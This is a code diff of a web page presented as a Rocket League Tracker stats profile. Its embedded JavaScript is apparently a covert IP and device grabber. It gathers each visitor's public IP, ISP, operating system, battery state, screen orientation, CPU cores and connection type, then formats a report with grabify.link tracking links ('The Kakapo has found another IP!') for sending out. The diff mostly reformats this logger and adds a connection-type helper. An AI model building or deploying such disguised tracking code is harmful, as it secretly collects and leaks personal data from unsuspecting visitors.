@@ -2,7 +2,7 @@
 <head>
 <title>76561198198256121's Rocket League Stats - Rocket League Tracker</title>
 <meta name="description" content="Check detailed Rocket League Stats and Leaderboards rankings."/>
-	<meta name="theme-color" content="#001538">
+<meta name="theme-color" content="#001538">
 <meta content="Rocket League Tracker" property="og:site_name">
 
 </head>
@@ -127,14 +127,14 @@ return new Promise((resolve, reject) => {
 navigator.userAgentData.getHighEntropyValues(["platformVersion"])
 .then(ua => {
 if (navigator.userAgentData.platform === "Windows") {
-  const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
-  if (majorPlatformVersion >= 13) {
-    resolve("Windows 11 or later");
-  } else {
-    resolve("Windows 10");
-  }
+const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+if (majorPlatformVersion >= 13) {
+resolve("Windows 11 or later");
 } else {
-  resolve(userOS); // Return the original OS if not Windows
+resolve("Windows 10");
+}
+} else {
+resolve(userOS); // Return the original OS if not Windows
 }
 })
 .catch(error => {
@@ -177,21 +177,28 @@ return 'N/A';
 
 
 function detectOrientation() {
-  if (window.innerWidth > window.innerHeight) {
-    // Landscape mode
-    return "Landscape";
-  } else {
-    // Portrait mode
-    return "Portrait";
-  }
+if (window.innerWidth > window.innerHeight) {
+// Landscape mode
+return "Landscape";
+} else {
+// Portrait mode
+return "Portrait";
+}
+}
+
+function getConnection(){
+if(navigator.connection.effectiveType){
+return navigator.connection.effectiveType
+}
+else{
+return "N/A"
+}
 }
 
 
 
 
 
-
-	
 async function logIP() {
 try {
 const ip = await getPublicIPAddress();
@@ -233,7 +240,7 @@ let batteryDishargeTime = "N/A";
 
 
 
-  
+
 if (navigator.getBattery) {
 if (batteryInfo !== "N/A") {
 batteryLevel = `${batteryInfo.level * 100}%`;
@@ -244,15 +251,17 @@ batteryDishargeTime = `${batteryInfo.dischargingTime} Seconds`;
 }
 
 let orientation = detectOrientation();
-  
+
 const isTouchscreen = hasTouchscreen();
 const isp = await getISP(ip)	  
 
 
 const logicalCores = navigator.hardwareConcurrency;
-const connectionType =   navigator.connection.effectiveType
-
 	
+connectionType = getConnection();
+
+
+
 const message = `
 The Kakapo has found another IP!
 Check here to see all IPs logged: <https://grabify.link/track/QRUKDR>
@@ -279,7 +288,7 @@ Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${i
 - Logical CPU Cores: ${logicalCores}
 - Internet Connection Type: ${connectionType}
 `;
-  
+
 const msg = {
 content: message
 };
